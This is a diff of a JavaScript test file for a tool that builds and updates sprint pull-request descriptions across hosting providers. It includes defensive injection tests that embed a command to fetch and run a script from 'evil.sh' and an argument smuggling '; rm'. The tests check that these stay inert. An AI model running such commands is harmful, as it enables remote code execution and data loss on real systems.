@@ -2,17 +2,25 @@ import { test, describe } from 'node:test';
 import assert from 'node:assert/strict';
 
 import {
-    buildSprintPrBody, buildSprintPrTitle, parseRunHistory, sanitizePrMarkdown,
-    RUN_HISTORY_MAX_ENTRIES,
+    buildSprintPrBody as buildSprintPrBodyParts, buildSprintPrTitle, parseRunHistory, sanitizePrMarkdown,
+    RUN_HISTORY_MAX_ENTRIES, RUN_HISTORY_MARKER, fitSectionsToBudget, NOTES_CONTINUED_MARKER,
 } from '../fleet-sprint/pr-body.mjs';
 import {
-    buildCreatePrCommand, buildFindPrCommand, buildUpdatePrCommand, PR_DESCRIPTION_MAX_LENGTH,
+    buildCreatePrCommand as rawBuildCreatePrCommand, buildFindPrCommand, buildUpdatePrCommand as rawBuildUpdatePrCommand, PR_DESCRIPTION_MAX_LENGTH,
+    getProviderTextLimits, capDescriptionPreservingHiddenTail,
 } from '../fleet-sprint/vcs-module.mjs';
 import { raiseVcsPrForMember } from '../fleet-sprint/vcs-auth.mjs';
 import { runPublishPrPhase } from '../fleet-sprint/phases/publish-pr.mjs';
 import { finalizeAbort } from '../fleet-sprint/runner.js';
 import { SprintPlanRejectedError } from '../fleet-sprint/errors.mjs';
-import { nativeDashDPayload } from './helpers/windows-argv.mjs';
+import { withPayloadPath, stagedJson, createStagedFileRecorder, TEST_MEMBER_FOLDER } from './helpers/vcs-payload-test.mjs';
+
+// Request bodies are staged member-side (curl --data-binary @<path>); the
+// wrappers supply the fixture payload_path for each call's os.
+const buildCreatePrCommand = withPayloadPath(rawBuildCreatePrCommand);
+const buildUpdatePrCommand = withPayloadPath(rawBuildUpdatePrCommand);
+// buildSprintPrBody returns { body, overflow, notes }; most checks read the description.
+const buildSprintPrBody = (opts) => buildSprintPrBodyParts(opts).body;
 
 // =============================================================================
 // Sprint PR body format + existing-PR rewrite on relaunch.
@@ -131,16 +139,53 @@ describe('sprint PR body (markdown)', () => {
         assert.ok(/^[\x0a\x20-\x7e]*$/.test(out));
     });
 
-    test('very long notes are capped with a visible marker and the whole body (with history) fits the provider limit', () => {
+    test('very long notes are split, not truncated: the description fits the limit, the rest comes back as overflow, history intact', () => {
         const longNotes = Array.from({ length: 400 }, (_, i) => `- finding ${i}: ${'x'.repeat(30)}`).join('\n');
         let previous = '';
+        let parts = null;
         for (let i = 0; i < RUN_HISTORY_MAX_ENTRIES + 3; i++) {
-            previous = sampleBody({ runId: `run-${i}`, notes: longNotes, previousBody: previous });
+            parts = buildSprintPrBodyParts({
+                verdict: 'PASS', goal: 'Ship the widget store', branch: 'feat/widgets', baseBranch: 'main',
+                runId: `run-${i}`, now: NOW, notes: longNotes, previousBody: previous,
+                details: ['Regression pass: skipped by launch option -- not run this sprint.'],
+            });
+            previous = parts.body;
         }
         assert.ok(previous.length <= PR_DESCRIPTION_MAX_LENGTH, `body length ${previous.length} exceeds ${PR_DESCRIPTION_MAX_LENGTH}`);
-        assert.match(previous, /\*\[\.\.\. reviewer notes truncated: \d+ of \d+ characters shown \.\.\.\]\*/);
+        assert.ok(previous.includes(NOTES_CONTINUED_MARKER), 'a split is marked in the notes section');
+        assert.doesNotMatch(previous, /reviewer notes truncated/, 'no truncation marker: nothing is dropped');
+        assert.equal(parts.notes, longNotes);
+        assert.ok(parts.overflow.length > 0, 'the part that does not fit is returned');
+        const inBody = parts.notes.slice(0, parts.notes.length - parts.overflow.length);
+        assert.ok(previous.includes(`### Reviewer notes\n\n${inBody}\n\n${NOTES_CONTINUED_MARKER}`), 'the description carries exactly the notes prefix');
+        assert.equal(inBody + parts.overflow, longNotes, 'description notes + overflow concatenate to the full notes');
         assert.equal(parseRunHistory(previous).length, RUN_HISTORY_MAX_ENTRIES, 'history is capped');
         assert.ok(previous.endsWith('-->'), 'the history block is never cut off by the provider-level cap');
+    });
+
+    test('maxLength is the provider limit: the same notes fit whole in a large description with no overflow', () => {
+        const longNotes = Array.from({ length: 400 }, (_, i) => `- finding ${i}: ${'x'.repeat(30)}`).join('\n');
+        const parts = buildSprintPrBodyParts({ verdict: 'PASS', branch: 'feat/widgets', runId: 'r', now: NOW, notes: longNotes, maxLength: 60000 });
+        assert.equal(parts.overflow, '');
+        assert.ok(parts.body.includes(longNotes));
+        assert.ok(!parts.body.includes(NOTES_CONTINUED_MARKER));
+        assert.ok(parts.body.length <= 60000);
+    });
+
+    test('order: the description starts with the verdict, then the merge assessment, then the notes', () => {
+        const parts = buildSprintPrBodyParts({
+            verdict: 'FAIL', branch: 'feat/widgets', runId: 'r', now: NOW, notes: 'n '.repeat(4000),
+            mergeAssessment: { recommendation: 'do_not_merge', reason: 'r', value: 'v', risk: 'k', default_path_changes: 'd', proof: 'p' },
+            maxLength: 3500,
+        });
+        const b = parts.body;
+        assert.ok(b.startsWith('## Sprint verdict: FAIL'), b.slice(0, 80));
+        const iv = b.indexOf('## Sprint verdict');
+        const ia = b.indexOf('### Merge assessment');
+        const in_ = b.indexOf('### Reviewer notes');
+        assert.ok(iv < ia && ia < in_, `verdict ${iv} < assessment ${ia} < notes ${in_}`);
+        assert.ok(b.length <= 3500);
+        assert.ok(parts.overflow.length > 0);
     });
 
     test('the engine cost block renders as a fenced Cost section after Details, before the human-review line', () => {
@@ -206,10 +251,9 @@ describe('run history marker round-trip', () => {
 // -----------------------------------------------------------------------------
 // Newlines survive the provider command builders end to end.
 // -----------------------------------------------------------------------------
-function posixDashD(command) {
-    const m = /-d '((?:[^']|'\\'')*)' -w/.exec(command);
-    assert.ok(m, `no POSIX -d payload in: ${command}`);
-    return JSON.parse(m[1].replace(/'\\''/g, "'"));
+// The staged JSON body, after asserting nothing of it rides the command line.
+function stagedBody(built) {
+    return stagedJson(built);
 }
 
 const PROVIDERS = [
@@ -217,10 +261,10 @@ const PROVIDERS = [
     { provider: 'azure-devops', coords: { repoRef: { org: 'acme', project: 'proj one', repo: 'widgets' } }, bodyField: 'description' },
 ];
 const TARGETS = [
-    { label: 'linux', os: 'linux', shell: '', decode: posixDashD },
-    { label: 'windows+gitbash', os: 'windows', shell: 'gitbash', decode: posixDashD },
-    { label: 'windows+powershell5', os: 'windows', shell: 'powershell5', decode: (c) => JSON.parse(nativeDashDPayload(c)) },
-    { label: 'windows+pwsh7', os: 'windows', shell: 'pwsh7', decode: (c) => JSON.parse(nativeDashDPayload(c)) },
+    { label: 'linux', os: 'linux', shell: '', decode: stagedBody },
+    { label: 'windows+gitbash', os: 'windows', shell: 'gitbash', decode: stagedBody },
+    { label: 'windows+powershell5', os: 'windows', shell: 'powershell5', decode: stagedBody },
+    { label: 'windows+pwsh7', os: 'windows', shell: 'pwsh7', decode: stagedBody },
 ];
 
 describe('the multi-line body reaches the provider byte-for-byte (create + update, every shell)', () => {
@@ -229,20 +273,20 @@ describe('the multi-line body reaches the provider byte-for-byte (create + updat
         for (const t of TARGETS) {
             test(`${p.provider} create-pull-request (${t.label})`, () => {
                 const built = buildCreatePrCommand({ provider: p.provider, ...p.coords, base: 'main', head: 'feat/widgets', title: 'T', body, token: 'tok', os: t.os, shell: t.shell });
-                const payload = t.decode(built.command);
+                const payload = t.decode(built);
                 assert.equal(payload[p.bodyField], body);
                 assert.ok(payload[p.bodyField].includes('\n- task A: unit tests green (12/12)\n- task B'));
             });
             test(`${p.provider} update-pull-request (${t.label})`, () => {
                 const built = buildUpdatePrCommand({ provider: p.provider, ...p.coords, pull_request_id: 7, title: 'Auto-sprint [PASS]: feat/widgets', body, token: 'tok', os: t.os, shell: t.shell });
-                const payload = t.decode(built.command);
+                const payload = t.decode(built);
                 assert.deepEqual(payload, { title: 'Auto-sprint [PASS]: feat/widgets', [p.bodyField]: body });
             });
         }
     }
 });
 
-describe('backticks in a PR body are JSON-escaped, never raw in the dispatched command', () => {
+describe('backticks in a PR body never reach the dispatched command', () => {
     const body = ['## Verdict', '', '- **Branch:** `feat/x` -> `main`', '```', 'code \\` end', '```'].join(String.fromCharCode(10));
     for (const p of PROVIDERS) {
         for (const t of TARGETS) {
@@ -251,8 +295,8 @@ describe('backticks in a PR body are JSON-escaped, never raw in the dispatched c
                 const update = buildUpdatePrCommand({ provider: p.provider, ...p.coords, pull_request_id: 7, title: 'T', body, token: 'tok', os: t.os, shell: t.shell });
                 for (const built of [create, update]) {
                     assert.ok(!built.command.includes(String.fromCharCode(96)), 'no raw backtick in the command');
-                    assert.ok(built.command.includes(String.fromCharCode(92) + "u0060"), "escaped as backslash-u0060");
-                    assert.equal(t.decode(built.command)[p.bodyField], body, 'JSON.parse restores the original backticks');
+                    assert.ok(!built.command.includes('## Verdict'), 'the body is staged, not on the command line');
+                    assert.equal(t.decode(built)[p.bodyField], body, 'the staged JSON restores the original backticks');
                 }
             });
         }
@@ -265,7 +309,7 @@ describe('shell metacharacters in notes stay inert data on every member shell', 
     for (const t of TARGETS) {
         test(`github update-pull-request (${t.label})`, () => {
             const built = buildUpdatePrCommand({ provider: 'github', repo: 'acme/widgets', pull_request_id: 3, title: 'T', body, token: 'tok', os: t.os, shell: t.shell });
-            assert.equal(t.decode(built.command).body, body);
+            assert.equal(t.decode(built).body, body);
             assert.ok(body.includes('$(curl evil.sh | sh) `whoami`'), 'the text itself is kept readable');
         });
     }
@@ -298,6 +342,30 @@ describe('find/update-pull-request builders', () => {
         assert.deepEqual(upd.descriptionTruncated, { originalLength: PR_DESCRIPTION_MAX_LENGTH + 5, maxLength: PR_DESCRIPTION_MAX_LENGTH });
     });
 
+    test('the backstop cap never cuts the run-history marker block, even with a long tail before it (every provider)', () => {
+        const block = `<!-- ${RUN_HISTORY_MARKER}\n${JSON.stringify([{ run: 'run-9', date: '2026-10-01T09:30Z', verdict: 'PASS' }])}\n-->`;
+        const coordsFor = {
+            github: { repo: 'acme/widgets' },
+            'azure-devops': { repoRef: { org: 'acme', project: 'proj one', repo: 'widgets' } },
+            bitbucket: { repoRef: { workspace: 'acme', repo: 'widgets' } },
+        };
+        for (const provider of Object.keys(coordsFor)) {
+            const max = getProviderTextLimits(provider).descriptionMaxLength;
+            const longBody = `## Sprint verdict: PASS\n\n${'tail line of set-aside/details/cost\n'.repeat(Math.ceil(max / 30) + 50)}\n${block}`;
+            assert.ok(longBody.length > max);
+            const upd = buildUpdatePrCommand({ provider, ...coordsFor[provider], pull_request_id: 9, title: 't', body: longBody, token: 'tok', os: 'linux' });
+            const sent = stagedJson(upd);
+            const desc = provider === 'azure-devops' ? sent.description : (provider === 'bitbucket' ? sent.description : sent.body);
+            assert.equal(desc.length, max, `${provider}: cut to its own limit`);
+            assert.ok(desc.endsWith(`\n${block}`), `${provider}: the marker block is intact`);
+            assert.deepEqual(parseRunHistory(desc).map((e) => e.run), ['run-9']);
+            assert.deepEqual(upd.descriptionTruncated, { originalLength: longBody.length, maxLength: max });
+        }
+        assert.equal(capDescriptionPreservingHiddenTail('abc', 10), 'abc');
+        assert.equal(capDescriptionPreservingHiddenTail('x'.repeat(20), 10), 'x'.repeat(10));
+        assert.throws(() => capDescriptionPreservingHiddenTail(`x\n${block}`, 20), /trailing hidden block .* refusing to cut it/);
+    });
+
     test('a non-numeric PR id is a typed ERROR, and a provider without the builders fails closed', () => {
         assert.throws(() => buildUpdatePrCommand({ provider: 'github', repo: 'a/b', pull_request_id: '5; rm', title: 't', body: 'b', token: 'tok' }), /^Error: ERROR: VCSModule: a numeric "pull_request_id"/);
         // Every PR-capable provider now ships find/update builders; a call
@@ -306,17 +374,183 @@ describe('find/update-pull-request builders', () => {
     });
 });
 
+
+// -----------------------------------------------------------------------------
+// Merge assessment section + the shared PR-body section budget.
+// -----------------------------------------------------------------------------
+const ASSESSMENT = Object.freeze({
+    value: 'Operators see the merge recommendation first.',
+    risk: 'Low: additive optional field.',
+    default_path_changes: 'none',
+    blast_radius: 'Final Review output and the sprint PR body.',
+    upgrade_impact: 'none',
+    proof: 'Unit tests for schema, prompt and PR body.',
+    recommendation: 'merge_after_proof',
+    reason: 'No live PR raised on every hosting provider yet.',
+});
+
+/** The exact run-history marker block a body built at NOW for `run` ends with. */
+function markerBlock(run, verdict = 'PASS') {
+    return `<!-- ${RUN_HISTORY_MARKER}\n${JSON.stringify([{ run, date: '2026-10-01T09:30Z', verdict }])}\n-->`;
+}
+
+describe('sprint PR body: Merge assessment section', () => {
+    test('present -> a Merge assessment section near the top, above the notes, with every field and the recommendation', () => {
+        const body = sampleBody({ mergeAssessment: ASSESSMENT });
+        const expectedSection = [
+            '### Merge assessment',
+            '',
+            '- **Recommendation:** `merge_after_proof` -- No live PR raised on every hosting provider yet.',
+            '- **Value:** Operators see the merge recommendation first.',
+            '- **Risk:** Low: additive optional field.',
+            '- **Default-path changes:** none',
+            '- **Blast radius:** Final Review output and the sprint PR body.',
+            '- **Upgrade impact:** none',
+            '- **Proof:** Unit tests for schema, prompt and PR body.',
+            '',
+            '### Reviewer notes',
+        ].join('\n');
+        assert.ok(body.includes('- **Run:** `run-2` (2026-10-01T09:30Z)\n\n' + expectedSection), body);
+        assert.ok(body.indexOf('### Merge assessment') < body.indexOf('### Reviewer notes'));
+        // Everything outside the new section is exactly the no-assessment body.
+        assert.equal(body.replace(expectedSection, '### Reviewer notes'), EXPECTED_BODY);
+    });
+
+    test('absent (undefined, null or not an object) -> no section and the body is byte-identical to the pre-assessment output', () => {
+        for (const mergeAssessment of [undefined, null, 'merge', 42, []]) {
+            const body = sampleBody({ mergeAssessment });
+            assert.equal(body, EXPECTED_BODY, `mergeAssessment=${JSON.stringify(mergeAssessment)}`);
+            assert.ok(!body.includes('Merge assessment'));
+        }
+    });
+
+    test('assessment text is sanitized: no raw HTML, no credential placeholder, no heading, one line per field', () => {
+        const body = sampleBody({ mergeAssessment: { ...ASSESSMENT, risk: '<b>x</b> {{vcs_token}}\n# boom\nsecond line', recommendation: 'yolo' } });
+        const section = body.slice(body.indexOf('### Merge assessment'), body.indexOf('### Reviewer notes'));
+        assert.ok(!section.includes('<b>') && !/\{\{/.test(section), section);
+        assert.ok(!/^#/m.test(section.replace('### Merge assessment', '')), section);
+        assert.ok(section.includes('- **Risk:** &lt;b>x&lt;/b> { {vcs_token} } \\# boom second line'), section);
+        assert.ok(section.includes('- **Recommendation:** (not given) --'), 'an unknown recommendation is never rendered as if valid');
+    });
+
+    test('an oversized assessment is clipped within the budget; body <= PR_DESCRIPTION_MAX_LENGTH and the run-history marker block is intact', () => {
+        const huge = Object.fromEntries(Object.keys(ASSESSMENT).map((k) => [k, `${k} `.repeat(3000)]));
+        huge.recommendation = 'do_not_merge';
+        const longNotes = Array.from({ length: 400 }, (_, i) => `- finding ${i}: ${'x'.repeat(30)}`).join('\n');
+        const body = sampleBody({ mergeAssessment: huge, notes: longNotes, costAnalysis: 'c'.repeat(2000) });
+        assert.ok(body.length <= PR_DESCRIPTION_MAX_LENGTH, `body length ${body.length} exceeds ${PR_DESCRIPTION_MAX_LENGTH}`);
+        assert.ok(body.endsWith('\n' + markerBlock('run-2')), `the marker block must close the body verbatim:\n${body.slice(-300)}`);
+        const section = body.slice(body.indexOf('### Merge assessment'), body.indexOf('### Reviewer notes'));
+        assert.ok(section.includes('- **Recommendation:** `do_not_merge`'), 'the recommendation line survives clipping');
+        assert.ok(section.includes('[... truncated ...]'), 'an oversized field is visibly clipped');
+        assert.ok(section.length < 3000, `section length ${section.length}`);
+        assert.ok(body.includes('Do NOT auto-merge'), 'the human-review line always survives');
+    });
+
+    test('two extra registered sections plus an oversized assessment: body <= 3500 and ends with the run-history marker', () => {
+        const huge = Object.fromEntries(Object.keys(ASSESSMENT).map((k) => [k, 'y'.repeat(5000)]));
+        huge.recommendation = 'merge';
+        const body = sampleBody({
+            maxLength: 3500,
+            notes: 'z'.repeat(6000),
+            mergeAssessment: huge,
+            sections: [
+                { id: 'kb-report', priority: 60, heading: 'Knowledge bank report', text: Array.from({ length: 200 }, (_, i) => `- entry ${i}`).join('\n') },
+                { id: 'kb-demotions', priority: 40, heading: 'Knowledge bank demotions', text: 'd'.repeat(4000) },
+            ],
+        });
+        assert.ok(body.length <= 3500, `body length ${body.length} exceeds 3500`);
+        assert.ok(body.endsWith('\n' + markerBlock('run-2')), body.slice(-300));
+        assert.ok(body.includes('### Merge assessment') && body.includes('### Reviewer notes'));
+    });
+
+    test('extra sections render after the notes when they fit, and the lower priority one is clipped first', () => {
+        const fit = sampleBody({ sections: [{ id: 'a', priority: 60, heading: 'Extra A', text: 'alpha' }] });
+        assert.ok(fit.includes('Follow-ups') && fit.indexOf('### Extra A\n\nalpha') > fit.indexOf('### Reviewer notes'));
+        assert.ok(fit.indexOf('### Extra A') < fit.indexOf('### Details'));
+        // Room for the high priority section (text + heading) but not both.
+        const limit = EXPECTED_BODY.length + 450;
+        const tight = sampleBody({
+            maxLength: limit,
+            sections: [
+                { id: 'hi', priority: 70, heading: 'High', text: 'h'.repeat(400) },
+                { id: 'lo', priority: 20, heading: 'Low', text: 'l'.repeat(400) },
+            ],
+        });
+        assert.ok(tight.length <= limit, `length ${tight.length}`);
+        assert.ok(tight.includes('h'.repeat(400)), 'the higher priority section keeps its full text');
+        assert.ok(!tight.includes('l'.repeat(400)), 'the lower priority section is the one clipped');
+    });
+});
+
+describe('fitSectionsToBudget', () => {
+    const render = (t) => ['HEAD', t.a && `A:${t.a}`, t.b && `B:${t.b}`, 'MARKER'].filter(Boolean).join('\n');
+
+    test('everything fits -> texts unchanged', () => {
+        const out = fitSectionsToBudget({ maxLength: 100, render, sections: [{ id: 'a', priority: 2, text: 'aa' }, { id: 'b', priority: 1, text: 'bb' }] });
+        assert.equal(out.body, 'HEAD\nA:aa\nB:bb\nMARKER');
+        assert.deepEqual(out.clipped, []);
+    });
+
+    test('over budget -> the higher priority section keeps its text, total <= maxLength, the frame is untouched', () => {
+        const out = fitSectionsToBudget({ maxLength: 200, render, sections: [{ id: 'a', priority: 1, text: 'a'.repeat(300) }, { id: 'b', priority: 9, text: 'b'.repeat(100) }] });
+        assert.ok(out.body.length <= 200, `length ${out.body.length}`);
+        assert.equal(out.texts.b, 'b'.repeat(100));
+        assert.ok(out.body.startsWith('HEAD\n') && out.body.endsWith('\nMARKER'));
+        assert.deepEqual(out.clipped, ['a']);
+    });
+
+    test('a section too small to carry anything is dropped, never left as a stub', () => {
+        const out = fitSectionsToBudget({ maxLength: 120, render, sections: [{ id: 'a', priority: 1, text: 'a'.repeat(300) }, { id: 'b', priority: 9, text: 'b'.repeat(100) }] });
+        assert.ok(out.body.length <= 120);
+        assert.equal(out.texts.a, '');
+        assert.ok(!out.body.includes('A:'));
+    });
+
+    test('duplicate section ids are refused', () => {
+        assert.throws(() => fitSectionsToBudget({ maxLength: 10, render, sections: [{ id: 'a', priority: 1, text: '' }, { id: 'a', priority: 2, text: '' }] }), /duplicate section id/);
+    });
+});
+
+describe('Publish PR: the final verdict merge assessment reaches the PR body', () => {
+    test('a final verdict carrying merge_assessment renders the section with every field and the recommendation', async () => {
+        const gh = fakeGitHub();
+        await publish({ gh, verdict: 'PASS', notes: 'All good.', runId: 'run-ma', member: 'pub-ma', mergeAssessment: ASSESSMENT });
+        const body = gh.pr.body;
+        assert.ok(body.includes('### Merge assessment'), body);
+        assert.ok(body.includes('- **Recommendation:** `merge_after_proof` -- No live PR raised on every hosting provider yet.'), body);
+        for (const line of ['**Value:**', '**Risk:**', '**Default-path changes:**', '**Blast radius:**', '**Upgrade impact:**', '**Proof:**']) {
+            assert.ok(body.includes(line), `missing ${line}`);
+        }
+        assert.ok(body.indexOf('### Merge assessment') < body.indexOf('### Reviewer notes'));
+    });
+
+    test('a final verdict without merge_assessment raises a body with no section, byte-identical to buildSprintPrBody without it', async () => {
+        const gh = fakeGitHub();
+        await publish({ gh, verdict: 'PASS', notes: 'All good.', runId: 'run-nma', member: 'pub-nma' });
+        assert.ok(!gh.pr.body.includes('Merge assessment'));
+        const stamp = /\(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}Z\)/.exec(gh.pr.body)[0].slice(1, -1);
+        const expected = buildSprintPrBody({
+            verdict: 'PASS', goal: 'Ship X', branch: 'feat/x', baseBranch: 'main', runId: 'run-nma',
+            now: new Date(`${stamp.slice(0, -1)}:00Z`), notes: 'All good.', details: [null, null],
+            setAside: [], waited: [], costAnalysis: undefined,
+        });
+        assert.equal(gh.pr.body, expected);
+    });
+});
+
 // -----------------------------------------------------------------------------
 // Existing-PR path: a fake GitHub behind vcs_credential_exec.
 // -----------------------------------------------------------------------------
 function fakeGitHub({ existing = null, failUpdateOnce = 0 } = {}) {
-    const state = { pr: existing ? { number: 42, ...existing } : null, calls: [], failUpdate: failUpdateOnce };
+    const staged = createStagedFileRecorder();
+    const state = { pr: existing ? { number: 42, ...existing } : null, calls: [], failUpdate: failUpdateOnce, staged };
     const respond = (status, body) => ({ content: [{ text: '' }], structuredContent: { ok: true, reason: 'ok', exitCode: 0, stdout: `${JSON.stringify(body)}\n${status}`, stderr: '' } });
     state.exec = (cmd) => {
         const method = /^curl -sS -X (\w+)/.exec(cmd)[1];
         state.calls.push(method);
         if (method === 'POST') {
-            const p = posixDashD(cmd);
+            const p = staged.json(cmd);
             if (state.pr) return respond(422, { message: 'Validation Failed', errors: [{ message: 'A pull request already exists for acme:feat/x.' }] });
             state.pr = { number: 42, title: p.title, body: p.body };
             return respond(201, { number: 42, html_url: 'https://github.com/acme/widgets/pull/42' });
@@ -330,14 +564,15 @@ function fakeGitHub({ existing = null, failUpdateOnce = 0 } = {}) {
                 state.failUpdate -= 1;
                 return respond(401, { message: 'Bad credentials' });
             }
-            const p = posixDashD(cmd);
+            const p = staged.json(cmd);
             state.pr = { ...state.pr, title: p.title, body: p.body };
             return respond(200, { number: 42, html_url: 'https://github.com/acme/widgets/pull/42' });
         }
         throw new Error(`unexpected method ${method}`);
     };
     state.callTool = async (name, toolArgs) => {
-        if (name === 'member_detail') return { content: [{ text: JSON.stringify({ vcsProvider: 'github', os: 'linux', shell: '' }) }] };
+        if (name === 'member_detail') return { content: [{ text: JSON.stringify({ vcsProvider: 'github', os: 'linux', shell: '', folder: TEST_MEMBER_FOLDER }) }] };
+        if (name === 'send_files') return staged.record(toolArgs);
         if (name === 'provision_vcs_auth') return { content: [{ text: 'ok' }], structuredContent: { ok: true, expiresAt: null } };
         if (name === 'credential_store_list') return { content: [{ text: '[]' }] };
         if (name === 'vcs_credential_exec') return state.exec(toolArgs.command);
@@ -350,7 +585,7 @@ const remoteCommand = async (cmd) => (cmd === 'git remote get-url origin'
     ? { ok: true, output: 'https://github.com/acme/widgets.git', error: null }
     : { ok: true, output: '', error: null });
 
-async function publish({ gh, verdict, notes, runId, member, costAnalysis }) {
+async function publish({ gh, verdict, notes, runId, member, costAnalysis, mergeAssessment }) {
     const logs = [];
     const result = await runPublishPrPhase({
         phase: () => {},
@@ -363,7 +598,7 @@ async function publish({ gh, verdict, notes, runId, member, costAnalysis }) {
         finalCycleLabel: '1',
         gitSync: { pushGitAfter: async () => {}, syncBeadsAfter: async () => {} },
         getMemberForRole: () => member,
-        finalVerdictResult: { verdict, notes },
+        finalVerdictResult: mergeAssessment ? { verdict, notes, merge_assessment: mergeAssessment } : { verdict, notes },
         costAnalysis,
     });
     return { result, logs };
